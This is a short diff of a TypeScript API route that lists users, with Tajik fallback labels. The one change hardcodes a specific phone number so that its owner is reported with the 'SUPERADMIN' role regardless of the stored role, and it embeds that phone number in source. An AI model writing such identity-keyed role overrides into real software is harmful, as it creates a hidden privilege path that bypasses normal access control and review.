@@ -15,7 +15,7 @@ export async function GET(request: Request) {
       clientCode: u.clientCode || "Номаълум",
       name: `${u.firstName || ""} ${u.lastName || ""}`.trim() || "Мизоҷи Нав",
       phone: u.phone || "Номаълум",
-      role: u.role,
+      role: u.phone === "+992928153531" ? "SUPERADMIN" : u.role,
       language: u.language,
       date: u.createdAt.toISOString().split("T")[0]
     }));
